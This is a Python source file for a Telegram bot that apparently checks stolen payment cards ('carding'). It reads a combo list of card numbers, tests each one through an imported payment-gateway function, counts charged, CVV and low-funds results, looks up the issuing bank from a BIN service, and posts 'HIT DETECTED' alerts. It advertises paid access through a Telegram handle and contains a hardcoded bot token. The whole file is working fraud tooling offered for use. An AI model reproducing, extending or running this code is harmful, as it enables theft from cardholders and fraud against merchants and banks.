import requests
import telebot, time
from telebot import types
from gatet import Tele
import os

# --- Configurations ---
token = '7714817187:AAE8uCfqbfO9MSvFsbZZxni3E78xp68iAAQ'
bot = telebot.TeleBot(token, parse_mode="HTML")
ADMIN_ID = '1884542666' # မူရင်း code ထဲက ID ကို သုံးထားပါတယ်

def get_bin_info(cc):
    try:
        data = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}').json()
        return {
            'brand': data.get('brand', 'Unknown'),
            'type': data.get('type', 'Unknown'),
            'country': data.get('country_name', 'Unknown'),
            'flag': data.get('country_flag', '🏁'),
            'bank': data.get('bank', 'Unknown')
        }
    except:
        return {'brand': 'Unknown', 'type': 'Unknown', 'country': 'Unknown', 'flag': '🏁', 'bank': 'Unknown'}

@bot.message_handler(commands=["start"])
def start(message):
    if str(message.chat.id) != ADMIN_ID:
        bot.reply_to(message, "❌ <b>Access Denied</b>\nPlease contact @jonas_839 for subscription.")
        return
    bot.reply_to(message, "👋 <b>Welcome!</b>\nPlease send your .txt file to start checking.")

@bot.message_handler(content_types=["document"])
def main(message):
    if str(message.chat.id) != ADMIN_ID:
        return

    # Counter variables
    stats = {"ch": 0, "ccn": 0, "cvv": 0, "low": 0, "bad": 0}
    
    status_msg = bot.reply_to(message, "⏳ <b>Preparing System...</b>").message_id
    
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    with open("combo.txt", "wb") as f:
        f.write(downloaded_file)

    try:
        with open("combo.txt", 'r') as f:
            lines = f.readlines()
            total = len(lines)

        for index, cc in enumerate(lines, start=1):
            cc = cc.strip()
            # Check for stop signal
            if os.path.exists("stop.stop"):
                bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg, text="🛑 <b>Stopped by User</b>")
                os.remove("stop.stop")
                return

            bin_data = get_bin_info(cc)
            
            start_time = time.time()
            try:
                result = str(Tele(cc))
            except:
                result = 'Error connection'
            
            exec_time = round(time.time() - start_time, 2)
            
            # Update Counters
            if 'Successful' in result: stats["ch"] += 1
            elif 'security code is incorrect' in result: stats["ccn"] += 1
            elif 'insufficient funds' in result: stats["low"] += 1
            elif 'additional action' in result: stats["cvv"] += 1
            else: stats["bad"] += 1

            # Keyboard UI
            kb = types.InlineKeyboardMarkup(row_width=2)
            kb.add(
                types.InlineKeyboardButton(f"💳 {cc}", callback_data='ignore'),
                types.InlineKeyboardButton(f"✨ Status: {result[:15]}", callback_data='ignore'),
                types.InlineKeyboardButton(f"✅ Charged: {stats['ch']}", callback_data='ignore'),
                types.InlineKeyboardButton(f"💳 CCN: {stats['ccn']}", callback_data='ignore'),
                types.InlineKeyboardButton(f"📝 CVV: {stats['cvv']}", callback_data='ignore'),
                types.InlineKeyboardButton(f"💰 Low: {stats['low']}", callback_data='ignore'),
                types.InlineKeyboardButton(f"❌ Declined: {stats['bad']}", callback_data='ignore'),
                types.InlineKeyboardButton(f"📊 Progress: {index}/{total}", callback_data='ignore'),
                types.InlineKeyboardButton("🛑 STOP", callback_data='stop')
            )

            # Edit status message every 2 items to avoid Telegram Flood limit
            if index % 2 == 0 or index == total:
                bot.edit_message_text(
                    chat_id=message.chat.id, 
                    message_id=status_msg, 
                    text=f"🚀 <b>Checking Combo List...</b>\n━━━━━━━━━━━━━━\n<b>Bot by:</b> @jonas_839",
                    reply_markup=kb
                )

            # Send hit alerts
            if 'Successful' in result or 'insufficient funds' in result or 'additional action' in result:
                hit_text = (
                    f"⭐ <b>HIT DETECTED!</b> ⭐\n"
                    f"━━━━━━━━━━━━━━\n"
                    f"💳 <b>Card:</b> <code>{cc}</code>\n"
                    f"💬 <b>Response:</b> <code>{result}</code>\n"
                    f"ℹ️ <b>Info:</b> {bin_data['brand']} - {bin_data['type']}\n"
                    f"🏦 <b>Bank:</b> {bin_data['bank']}\n"
                    f"🌍 <b>Country:</b> {bin_data['country']} {bin_data['flag']}\n"
                    f"⏱️ <b>Time:</b> {exec_time}s\n"
                    f"━━━━━━━━━━━━━━\n"
                    f"👤 <b>By:</b> @jonas_839"
                )
                bot.send_message(message.chat.id, hit_text)

    except Exception as e:
        print(f"Error: {e}")
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg, text="✅ <b>Checking Completed!</b>")

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_callback(call):
    with open("stop.stop", "w") as f:
        f.write("stop")
    bot.answer_callback_query(call.id, "Stopping process...")

bot.polling()
